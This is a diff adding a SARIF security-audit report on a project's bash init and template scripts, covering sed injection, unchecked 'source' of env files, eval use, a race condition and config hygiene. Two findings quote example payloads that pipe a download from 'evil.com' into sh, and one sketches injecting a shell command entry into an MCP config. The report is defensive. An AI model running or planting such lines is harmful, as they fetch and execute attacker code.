@@ -1,0 +1,285 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "aod-security",
+          "version": "1.0.0",
+          "informationUri": "https://github.com/davidmatousek/tachi",
+          "rules": [
+            {
+              "id": "A03",
+              "name": "A03: Injection",
+              "shortDescription": {
+                "text": "A03: Injection"
+              },
+              "helpUri": "https://owasp.org/Top10/"
+            },
+            {
+              "id": "A08",
+              "name": "A08: Software and Data Integrity Failures",
+              "shortDescription": {
+                "text": "A08: Software and Data Integrity Failures"
+              },
+              "helpUri": "https://owasp.org/Top10/"
+            },
+            {
+              "id": "A05",
+              "name": "A05: Security Misconfiguration",
+              "shortDescription": {
+                "text": "A05: Security Misconfiguration"
+              },
+              "helpUri": "https://owasp.org/Top10/"
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "A03",
+          "message": {
+            "text": "User-controlled placeholder values from interactive `read -p` prompts (lines 24-28) flow into sed replacement strings without escaping. Sed interprets `&` (matched-pattern reference), `\\` (escape), `|` (the chosen delimiter), and `\\1`-`\\9` (capture-group backrefs) in the replacement. Concrete failure modes: `AT&T` becomes `ATtachiT` (silent integrity loss); `foo|bar` terminates the substitution expression, leaving the rest as a malformed sed flag string. Multi-hop execution chain: substituted output lands in .claude/mcp-config.json (a JSON file Claude Code parses to spawn MCP server processes) and 13 .claude/agents/*.md / commands/*.md files (LLM instructions). A carefully crafted PROJECT_NAME containing `\",\"command\":\"sh\",\"args\":[\"-c\",...` could inject an additional mcpServers entry whose command runs attacker-supplied code on next Claude Code launch. The repo already implements the safe alternative in .aod/scripts/bash/template-substitute.sh:318 using bash parameter expansion `${str//pat/rep}` (literal on both sides) \u2014 init.sh is the lone holdout."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "scripts/init.sh"
+                },
+                "region": {
+                  "startLine": 124
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "8b0f4b0d7e21f00a46210f10e6e025988d5d0425b1473f4e29373f125692e541"
+          },
+          "level": "error"
+        },
+        {
+          "ruleId": "A08",
+          "message": {
+            "text": "scripts/init.sh:69 executes `source \"stacks/$SELECTED_PACK/defaults.env\"` without any integrity check. The `source` builtin executes ANY bash code in the file \u2014 not just KEY=VALUE assignments. A defaults.env containing `TECH_STACK=foo; curl evil.com/x | sh; #` would run the curl pipe at adopter init time. No manifest hash, signature, or content allowlist is enforced. Threat scenarios: (a) supply-chain compromise of the tachi repo itself \u2014 attacker modifies an existing pack's defaults.env; (b) malicious PR contributing a new stack pack with hidden code in defaults.env; (c) downstream adopter who fetches a tampered tag (the retag tripwire in template-git.sh covers .aod/aod-kit-version pins but does NOT cover stack pack directory contents)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "scripts/init.sh"
+                },
+                "region": {
+                  "startLine": 69
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "2e6425adbddb4955cb8ade6bc25da0be7101be236135ce62b91c5c4d8ffc15e9"
+          },
+          "level": "error"
+        },
+        {
+          "ruleId": "A03",
+          "message": {
+            "text": "aod_template_read_version_file (line 544) sources .aod/aod-kit-version directly into the caller's scope on line 561, THEN validates the parsed variables. If the version file was tampered with \u2014 e.g., `sha=$(curl evil.com|sh)abc...` \u2014 the command substitution executes at source time, BEFORE field validation has any chance to reject it. The validation logic on lines 568-619 is dead code in the malicious-input path because the attack already ran. Compare to .aod/scripts/bash/template-substitute.sh:162-169 which sources in a subshell first to test bash-sourceability without polluting caller scope, then sources into caller scope only if the file passes validation. template-git.sh skipped this safety pattern. Threat: local attacker (or compromised CI runner) with write access to .aod/aod-kit-version achieves arbitrary code execution at next /aod.update or init invocation."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".aod/scripts/bash/template-git.sh"
+                },
+                "region": {
+                  "startLine": 561
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "6bc16d0b3f74004c19a6c12fbb734e5ae507b1696e51aea14c5286bfdf43071b"
+          },
+          "level": "error"
+        },
+        {
+          "ruleId": "A03",
+          "message": {
+            "text": "Interactive prompts at init.sh:24-28 (PROJECT_NAME, PROJECT_DESCRIPTION, GITHUB_ORG, GITHUB_REPO) accept any input including newlines, NUL bytes, control characters, and arbitrarily long strings. While aod_template_init_personalization (template-substitute.sh:516) validates newlines at write time and aborts with exit 8, defense-in-depth requires prompt-time rejection so adopters get immediate feedback. Currently a paste with a trailing newline fails opaquely at write time after all the substitution has already run against 25 files."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "scripts/init.sh"
+                },
+                "region": {
+                  "startLine": 24
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "2dadc6cede87e5dfbb672e32027f5496c99131ec35043cfd89605baec1d5588d"
+          },
+          "level": "warning"
+        },
+        {
+          "ruleId": "A05",
+          "message": {
+            "text": "The personalization snapshot file .aod/personalization.env is created by init.sh:346 with all 12 canonical placeholder values: PROJECT_NAME, PROJECT_DESCRIPTION, GITHUB_ORG, GITHUB_REPO, AI_AGENT, TECH_STACK, TECH_STACK_DATABASE, TECH_STACK_VECTOR, TECH_STACK_AUTH, RATIFICATION_DATE, CURRENT_DATE, CLOUD_PROVIDER. The file is not in .gitignore \u2014 adopters running `git add -A` or `git add .aod/` commit it. PROJECT_DESCRIPTION may contain proprietary product positioning before public launch; GITHUB_ORG/REPO leaks private repo identity in any template fork. A safer default is to gitignore the file and document that adopters who genuinely need it tracked (e.g., for CI personalization) can remove the gitignore entry consciously."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".gitignore"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "5c3812ec6abe8ea17100d3c2fcb43a5b8098eae99316a5801002a94b99fb2b5c"
+          },
+          "level": "warning"
+        },
+        {
+          "ruleId": "A03",
+          "message": {
+            "text": "Lines 224, 511, 533 use `eval \"AOD_PERSONALIZATION_${key}=\\\"\\$val\\\"\"` and similar patterns to dynamically assign variables. The $key is from the hardcoded canonical array (safe), but $val passes through a second shell evaluation. The current double-source flow (line 162 subshell pre-check + line 184 caller-scope source) already executes any code in the env file at source time, so the eval at line 224 is downstream of the actual exec sink \u2014 but the eval pattern is itself a code smell that turns a hardening of the source layer into wasted effort. printf -v achieves the same dynamic-name assignment without the second evaluation pass and is bash 3.2 compatible."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".aod/scripts/bash/template-substitute.sh"
+                },
+                "region": {
+                  "startLine": 224
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "572bcfaac0fb46589f5cc455fde13adb49fea01abbc20ee5e4f1de750069b342"
+          },
+          "level": "warning"
+        },
+        {
+          "ruleId": "A05",
+          "message": {
+            "text": "aod_template_load_personalization_env (line 143) reads .aod/personalization.env twice: once in a subshell at line 162-169 (to test bash-sourceability), once in caller scope at line 184 (to actually load values). An attacker with write access to .aod/ can replace the file between the two reads \u2014 the validation passes against the safe content while the loaded variables come from the malicious replacement. Race window is tiny in practice (milliseconds) but TOCTOU is exploitable in adversarial environments (e.g., shared dev VMs, CI runners with multiple tenants)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".aod/scripts/bash/template-substitute.sh"
+                },
+                "region": {
+                  "startLine": 162
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "fda18f82557bf66a02b358ee747389298a3552d4ef917052824385a45601a4e1"
+          },
+          "level": "warning"
+        },
+        {
+          "ruleId": "A03",
+          "message": {
+            "text": "Lines 235-241 contain two more `sed -i` invocations on .aod/memory/constitution.md to remove HTML comment blocks and template-instruction sections. Same sed metacharacter interpretation class as F1 \u2014 the substitution patterns are static (not user-controlled) so injection risk is low, but the constitution.md content itself can contain `&`, `\\`, and other metachars in legitimate prose. If the upstream constitution template ever introduces content matching the sed delete-range pattern (`^<!--$/,/^-->$/d`), unintended deletion follows silently."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "scripts/init.sh"
+                },
+                "region": {
+                  "startLine": 235
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "8755fa4c239f455323a1083eb4e6b264ab8ad377b6c64649ade18d08e59e9986"
+          },
+          "level": "note"
+        },
+        {
+          "ruleId": "A05",
+          "message": {
+            "text": "aod_template_fetch_upstream invokes `git clone --depth=1 --branch \"$ref\" --quiet \"$url\" \"$destdir\"` with no timeout. A malicious or compromised upstream can hold the connection open indefinitely, blocking init.sh / update.sh. Caller has no way to interrupt cleanly. Combined with the URL-scheme allowlist (https:// or file://), the practical attack surface is constrained, but a long-running CI job that calls /aod.update unattended could hang."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".aod/scripts/bash/template-git.sh"
+                },
+                "region": {
+                  "startLine": 102
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "f1f5431b147a13deb8db9f7c2cc305026ba8a6f47d5175b1ed3b89af22b8fc56"
+          },
+          "level": "note"
+        },
+        {
+          "ruleId": "A05",
+          "message": {
+            "text": "The repository has no SECURITY.md file at the root. Security researchers who find vulnerabilities have no documented disclosure channel. GitHub auto-generates a 'Report a vulnerability' button when SECURITY.md is present and references its content. Absence is not a vulnerability per se but is a posture finding for an enterprise-hardening initiative \u2014 the very LinkedIn thread that triggered this scan is itself a public-disclosure incident that a SECURITY.md could have channeled into a private report."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "SECURITY.md"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "ac2d3371fd137cd709607dc0cb17939b49c75a246605aaf9e943e320b2074063"
+          },
+          "level": "note"
+        },
+        {
+          "ruleId": "A03",
+          "message": {
+            "text": ".claude/mcp-config.json contains {{PROJECT_PATH}} placeholders on lines 6 and 9. PROJECT_PATH is NOT in the canonical-12 placeholder list (.aod/scripts/bash/template-substitute.sh:50-63). Even after F-1 is fixed by switching init.sh to aod_template_substitute_placeholders, this placeholder will remain unsubstituted, leaving the MCP config non-functional and incomplete substitution surface across the personalization contract. The file appears to be an unwired example template \u2014 it is not actually loaded by any current Claude Code configuration in the repo."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".claude/mcp-config.json"
+                },
+                "region": {
+                  "startLine": 6
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "57ed66434bd78df1ba49617b01de6f13cb14522648a32ef5ba5037d268d252e2"
+          },
+          "level": "note"
+        }
+      ]
+    }
+  ]
+}
